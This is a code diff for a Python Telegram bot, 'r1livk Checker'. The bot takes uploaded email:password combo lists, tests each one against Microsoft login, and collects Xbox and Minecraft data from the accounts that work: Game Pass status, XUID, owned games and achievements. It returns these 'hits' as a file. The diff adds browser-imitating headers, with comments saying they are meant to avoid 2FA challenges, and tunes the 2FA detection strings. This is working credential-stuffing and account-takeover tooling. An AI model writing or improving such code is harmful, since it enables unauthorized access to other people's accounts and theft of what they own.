@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Pro Inventory & Entitlements Games Extractor)
+r1livk Checker ⚡ - Telegram Bot (Ultimate Pro Version with Enhanced Headers)
 """
 
 import os
@@ -60,7 +60,6 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
     owned_games_formatted = []
     
     try:
-        # استخدام RelyingParty الخاص بالمتجر للحصول على صلاحيات أوسع
         xsts_xb_payload = {
             "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
@@ -79,7 +78,7 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                 "Accept-Language": "en-US"
             }
             
-            # 1. فحص اشتراكات الجيم باس بدقة
+            # 1. فحص اشتراكات الجيم باس
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
             sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, timeout=10)
@@ -91,7 +90,7 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                         game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                         break
 
-            # 2. جلب الـ XUID باستخدام الـ Headers المتقدمة
+            # 2. جلب الـ XUID
             inv_headers = headers.copy()
             inv_headers["x-xbl-contract-version"] = "4"
             
@@ -131,7 +130,7 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                             if counter > 15:
                                 break
 
-            # 4. خطة بديلة: الإنجازات التفصيلية مع الـ Score الحقيقي لكل لعبة
+            # 4. خطة بديلة: الإنجازات التفصيلية مع الـ Score الحقيقي
             if not owned_games_formatted:
                 ach_url = "https://achievements.xboxlive.com/users/me/achievements"
                 ach_resp = session.get(ach_url, headers=headers, timeout=10)
@@ -171,9 +170,21 @@ def check_single_account(combo):
     session.verify = False
     session.mount('https://', adapter)
     session.mount('http://', adapter)
+    
+    # تحسين الهيدرز لتحاكي متصفح حقيقي بالكامل وتجنب الـ 2FA الوهمي
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
+        "Cache-Control": "max-age=0",
+        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1"
     })
 
     try:
@@ -220,7 +231,8 @@ def check_single_account(combo):
                 ms_token = token_match.group(1)
         
         if not ms_token:
-            if any(x in login_text for x in ["recover", "identity/confirm", "locked", "security challenge", "two-step", "additional security"]):
+            # تدقيق حقيقي لضمان عدم تحويل الحسابات السليمة لـ 2FA وهمي
+            if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs"]):
                 session.close()
                 return "twofa", None
             session.close()
@@ -317,7 +329,7 @@ def send_welcome(message):
         "• Pro Inventory & Games List\n"
         "• Gamertag & Gamerscore\n"
         "• Minecraft Entitlements\n"
-        "• Email Access & 2FA detection\n\n"
+        "• Anti-2FA Browser Headers\n\n"
         "Click the button below to start checking your combo files!"
     )
     bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)
@@ -331,13 +343,13 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **r1livk Checker - Pro Inventory Mode**\n\n"
+            "🎮 **r1livk Checker - Ultimate Mode**\n\n"
             "Full account capture with advanced games extraction:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Inventory & Entitlements Games List\n"
+            "• Inventory Games List\n"
             "• Gamertag & Profile\n"
-            "• 2FA detection\n\n"
+            "• Anti-2FA Protection\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
             "Format: `email:password`"
         )
@@ -368,7 +380,7 @@ def handle_docs(message):
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
-        bot.reply_to(message, "📥 File received. Starting Pro Inventory scan...")
+        bot.reply_to(message, "📥 File received. Starting Ultimate scan...")
         active_scans[chat_id] = True
         threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
 
@@ -390,7 +402,7 @@ def process_checker(chat_id, filepath):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_InventoryHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Checker_UltimateHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -399,7 +411,7 @@ def process_checker(chat_id, filepath):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS (Inventory Mode)**\n\n"
+        f"🔥 **LIVE SCAN STATS (Ultimate Mode)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -489,7 +501,7 @@ def process_checker(chat_id, filepath):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **XBOX PRO SCAN COMPLETED!**\n\n"
+        f"✅ **XBOX ULTIMATE SCAN COMPLETED!**\n\n"
         f"📊 Total: {total}\n"
         f"🎯 Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
@@ -503,12 +515,12 @@ def process_checker(chat_id, filepath):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Inventory Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Ultimate Hits File - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Pro Inventory Extractor Bot is running...")
+    print("r1livk Ultimate Checker Bot is running...")
     bot.infinity_polling()
